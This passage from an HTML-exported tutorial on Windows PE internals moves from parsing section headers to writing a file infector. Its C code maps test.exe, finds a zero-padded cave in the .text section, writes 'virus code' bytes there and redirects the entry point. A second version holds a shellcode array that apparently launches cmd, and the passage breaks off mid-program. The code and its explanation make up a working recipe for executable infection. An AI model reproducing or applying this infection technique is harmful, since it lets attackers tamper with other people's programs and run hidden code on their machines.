font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>section *sec;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>HANDLE hfile,hfile1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>unsigned char *pmappedfile, *dummy;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>hfile =
CreateFile(&quot;test.exe&quot;,GENERIC_WRITE |
GENERIC_READ,0,0,OPEN_EXISTING,0,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>hfile1 = CreateFileMapping (hfile, 0,
PAGE_READWRITE, 0, 0, 0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pmappedfile = (unsigned char
*)MapViewOfFile(hfile1,FILE_MAP_ALL_ACCESS,0,0,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>IMAGE_DOS_HEADER
*pimagedosheader<span style="mso-spacerun: yes">  </span>= (IMAGE_DOS_HEADER
*)pmappedfile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>dummy = (unsigned char<span
style="mso-spacerun: yes">  </span>*)(pmappedfile +
pimagedosheader-&gt;e_lfanew);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>IMAGE_FILE_HEADER *pimagefileheader =
(IMAGE_FILE_HEADER *)(pmappedfile + pimagedosheader-&gt;e_lfanew +4);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>IMAGE_OPTIONAL_HEADER
*pimageoptionalheader = (IMAGE_OPTIONAL_HEADER *)((unsigned char
*)pimagefileheader+sizeof(IMAGE_FILE_HEADER));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>sec = (struct section*)((char
*)pimageoptionalheader + sizeof(IMAGE_OPTIONAL_HEADER));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;Section<span
style="mso-spacerun: yes">    </span>PointerToRawData<span style="mso-spacerun:
yes">  </span>SizeOfRawData VirtualAddress VirtualSize\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>for (int
i=0;i&lt;pimagefileheader-&gt;NumberOfSections;i++)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

<p class=WW-PlainText><span style='font-family:"Trebuchet MS";color:#000066'>printf(&quot;%s<span
style="mso-spacerun: yes">      </span>%05x<span style="mso-spacerun:
yes">             </span>%05x<span style="mso-spacerun: yes">        
</span>%05x<span style="mso-spacerun: yes">         
</span>%05x\n&quot;,sec[i].Name , sec[i].PointerToRawData,sec[i]. SizeOfRawData,sec[i].VirtualAddress,sec[i].VirtualSize);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Output<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>Section<span
style="mso-spacerun: yes">    </span>PointerToRawData<span style="mso-spacerun:
yes">  </span>SizeOfRawData VirtualAddress VirtualSize<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>.text<span
style="mso-spacerun: yes">      </span>00600<span style="mso-spacerun:
yes">             </span>12600<span style="mso-spacerun: yes">        
</span>01000<span style="mso-spacerun: yes">          </span>124ee<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>.data<span
style="mso-spacerun: yes">      </span>12c00<span style="mso-spacerun:
yes">             </span>00c00<span style="mso-spacerun: yes">        
</span>14000<span style="mso-spacerun: yes">          </span>010c0<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>.rsrc<span
style="mso-spacerun: yes">      </span>13800<span style="mso-spacerun:
yes">             </span>02c00<span style="mso-spacerun: yes">        
</span>16000<span style="mso-spacerun: yes">          </span>02b98<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>This program proceeds further to
display the details of the section headers that immediately follow the Image
Optional header. There is one section header per section and the size of each
header is 40 bytes. A structure called section is created knowing that there is
one in winnt.h just to explain things better. Even though we are interested in
the first five members only, we yet need a structure 40 bytes long as thee
section headers are stored back to back. This explains the padding of 16 bytes
towards the end. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The Image File header has a member
which gives the number of sections present in the executable. Thus using a for
loop details of each section can be displayed. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The first member of the header is
always the name of the section which starts with a dot generally and is
restricted to 8 bytes. The section that carries code is always called .text,
the one carrying data .data and the one carrying resources, ,rsrc. Even though
the above name are predefined, using the compiler options, we can create our
own sections and give it user-defined names that may not start with a dot. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The next member even though is called
Virtual Size is the actual size of the section data. Similarly, there is one
more field called Size of Raw Data which is the same value but rounded up to
the section size on disk i.e. 512 bytes. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The field PointerToRawData is the
position or offset of the section on disk. Thus its value is a multiple of
section alignment or 512 bytes. The loader uses this concept to identify where
each section starts on disk. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The VirtualAddress field is the
offset when the section is loaded in memory where all values are a multiple of
1000 hex. This is where the sections are to be found in memory. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>a.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>#include &lt;windows.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>#include &lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>struct section {<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>BYTE<span style="mso-spacerun:
yes">    </span>Name[8];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>DWORD<span style="mso-spacerun:
yes">   </span>VirtualSize;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>DWORD<span style="mso-spacerun:
yes">   </span>VirtualAddress;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>DWORD<span style="mso-spacerun:
yes">   </span>SizeOfRawData;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>DWORD<span style="mso-spacerun:
yes">   </span>PointerToRawData;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>char a[16];<span style="mso-spacerun:
yes">    </span><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>};<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>void main()<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>unsigned char vcdcode[]=&quot;\xcc&quot;;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>section *psection;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>HANDLE hfile,hfile1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>unsigned char *pmappedfile, *dummy;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>long positionofvcd;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>int howmanyzeroes=0,i;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>hfile =
CreateFile(&quot;test.exe&quot;,GENERIC_WRITE |
GENERIC_READ,0,0,OPEN_EXISTING,0,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>hfile1 = CreateFileMapping (hfile, 0,
PAGE_READWRITE, 0, 0, 0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pmappedfile = (unsigned char
*)MapViewOfFile(hfile1,FILE_MAP_ALL_ACCESS,0,0,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>IMAGE_DOS_HEADER
*pimagedosheader<span style="mso-spacerun: yes">  </span>= (IMAGE_DOS_HEADER
*)pmappedfile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>dummy = (unsigned char<span
style="mso-spacerun: yes">  </span>*)(pmappedfile +
pimagedosheader-&gt;e_lfanew);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>IMAGE_FILE_HEADER *pimagefileheader =
(IMAGE_FILE_HEADER *)(pmappedfile + pimagedosheader-&gt;e_lfanew +4);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>IMAGE_OPTIONAL_HEADER
*pimageoptionalheader = (IMAGE_OPTIONAL_HEADER *)((unsigned char
*)pimagefileheader+sizeof(IMAGE_FILE_HEADER));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>psection = (struct section*)((char
*)pimageoptionalheader + sizeof(IMAGE_OPTIONAL_HEADER));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>int totalsize =
psection-&gt;PointerToRawData + psection-&gt;SizeOfRawData;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>for(positionofvcd=psection-&gt;PointerToRawData;positionofvcd
&lt;= totalsize;positionofvcd++)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>if(pmappedfile[positionofvcd]==0)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>howmanyzeroes++;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>if(howmanyzeroes==69)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>break;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>else<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>howmanyzeroes=0;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>positionofvcd -= 65;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>printf(&quot;positionofvcd=%x\n&quot;,positionofvcd);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pimageoptionalheader-&gt;AddressOfEntryPoint
= positionofvcd + psection-&gt;VirtualAddress - psection-&gt;PointerToRawData;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>int sizeofvcd = sizeof(vcdcode);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>for(i =0; i&lt;sizeofvcd ;i++)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pmappedfile[positionofvcd+i]=vcdcode[i];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>Output<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>positionofvcd=12af3<o:p></o:p></span></p>

<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
mso-fareast-font-family:"MS Mincho";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";mso-fareast-font-family:"MS Mincho";color:#000066'>We
have attempted to do something significant in this program. On executing the above
program, the program test.exe gets infected but in a rather unique way. Thus
when the executable test.exe is started, it displays a message box stating that
a breakpoint interrupt has been called. This thus implies that instead of the
code of the program test.exe being called, the breakpoint interrupt 0xcc has
been encountered. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";mso-fareast-font-family:"MS Mincho";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";mso-fareast-font-family:"MS Mincho";color:#000066'>Now
to the workings.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>A variable totalsize is initialized
to denote an offset that points to the end of the section. This offset is
achieved by adding the SizeOfRawData to the PointerToRawData field which points
to the section start. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The next goal is to find the place in
the .text section where there are 69 consecutive<span style="mso-spacerun:
yes">  </span>zeroes. This position within the .text section is required as we
will be copying our code or vcd (virus code) here thus not overwriting the
actual code. The text section like all other sections will be zero or null
padded till it reaches the section alignment. Thus finding 69 consecutive
zeroes is not too difficult. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>In the for loop, the variable
positionofvcd is set to the start of the .text section on disk. Nevertheless,
in an extreme case where we cannot find 69 consecutive zeroes, we would like
the loop to terminate when it reaches the end of the sections. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The file on disk and the bytes in
pmappedfile array is the same, so we check the byte in memory since it is
easier using the array notation. The pmappedfile refers to the start of memory
where the file is loaded and positionofvcd is the offset. When the value at the
offset is zero, the variable howmanyzeroes is incremented by one. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>Thus at any point in time variable
howmanyzeroes gives a count on the consecutive zeroes passed over. Also, when a
non zero value is encountered, the else block gets called where the variable is
reset to 0 again. Simultaneously, in the if statement a check is performed
whether the variable howmanyzeroes is 69. If so, the loop is terminated as 69
consecutive zeroes in the file have been found. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The offset variable positionofvcd
however is at the end of the 69 consecutive zeroes. Therefore to reposition it
to the start, the value must be subtracted by 69. We subtract 65 instead just
to keep 4 zeroes. What is 4 zeroes between us. This shows no errors and
everything works as advertised. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The next task is to change the entry
point RVA. Just to refreshen your memory, the entry point points to the first
byte of code that is to be executed and it is an RVA. The value for this field
should now point to the start of 65 consecutive zeroes. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>The position of vcd is an offset from
the start of the file and therefore the start of the section stored in the
PointerToRawData member of the section structure is subtract from it. The sec
variable points to the .text section thereby giving an offset from the
beginning of the text section. However our objective is to get the offset from
the image base and therefore the Sections VirtualAddress stored in the section
structure is added to convert it into an RVA. If we execute the program at this
stage, the loader would load test.exe into memory and then executed our code
which simply comprises 65 consecutive zeroes. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>So the next job is to add our code
that is to executed. For this purpose, an array of chars called vcdcode is
created which currently holds only one byte, i.e. CC the op code for a breakpoint.
Later the actual code will be inserted in this array. The code bytes of this
array is copied at the memory location of the consecutive zeroes. The variable
positionofvcd has the offset as to where these bytes need to be copied. The
system as always will write these bytes to disk. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>In this manner, the first of the
zeroes is replaced with a breakpoint. Now, when we run our program and then run
test, we see the breakpoint interrupt generated. Simply click on ok and proceed
to the next program that does much more. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>&nbsp;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>a.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>#include &lt;windows.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>#include &lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>struct section {<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>BYTE<span style="mso-spacerun:
yes">    </span>Name[8];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>DWORD<span style="mso-spacerun:
yes">   </span>VirtualSize;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>DWORD<span style="mso-spacerun:
yes">   </span>VirtualAddress;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>DWORD<span style="mso-spacerun:
yes">   </span>SizeOfRawData;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>DWORD<span style="mso-spacerun:
yes">   </span>PointerToRawData;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>char a[16];<span style="mso-spacerun:
yes">    </span><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>};<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>void main()<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

<p class=WW-PlainText><span style='font-family:"Trebuchet MS";color:#000066'>unsigned
char vcdcode[] = &quot;\xcc\x55\x8B\xEC\x51\xC7\x45\xFC\x63\x6D\x64\x00\x6A\x05\x8b\xc5\x83\xe8\x04\x50\xB8\xcc\xcc\xcc\xcc\xFF\xD0\x8B\xE5\x5d&quot;;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>section *psection;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>HMODULE hloadlibrary;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>HANDLE hfile,hfile1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>unsigned char *pmappedfile, *dummy;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>long positionofvcd,haddresoffunction;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>int howmanyzeroes=0,i;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>hfile =
CreateFile(&quot;test.exe&quot;,GENERIC_WRITE |
GENERIC_READ,0,0,OPEN_EXISTING,0,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>hfile1 = CreateFileMapping (hfile, 0,
PAGE_READWRITE, 0, 0, 0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>pmappedfile = (unsigned char
*)MapViewOfFile(hfile1,FILE_MAP_ALL_ACCESS,0,0,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>IMAGE_DOS_HEADER
*pimagedosheader<span style="mso-spacerun: yes">  </span>= (IMAGE_DOS_HEADER
*)pmappedfile;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>dummy = (unsigned char<span
style="mso-spacerun: yes">  </span>*)(pmappedfile +
pimagedosheader-&gt;e_lfanew);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>IMAGE_FILE_HEADER *pimagefileheader =
(IMAGE_FILE_HEADER *)(pmappedfile + pimagedosheader-&gt;e_lfanew +4);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>IMAGE_OPTIONAL_HEADER
*pimageoptionalheader = (IMAGE_OPTIONAL_HEADER *)((unsigned char
*)pimagefileheader+sizeof(IMAGE_FILE_HEADER));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>psection = (struct section*)((char
*)pimageoptionalheader + sizeof(IMAGE_OPTIONAL_HEADER));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>int totalsize =
psection-&gt;PointerToRawData + psection-&gt;SizeOfRawData;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>for(positionofvcd=psection-&gt;PointerToRawData;positionofvcd
&lt;= totalsize;positionofvcd++)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify'><span style='font-size:10.0pt;
font-family:"Trebuchet MS";color:#000066'>{<o:p></o:p></span></p>

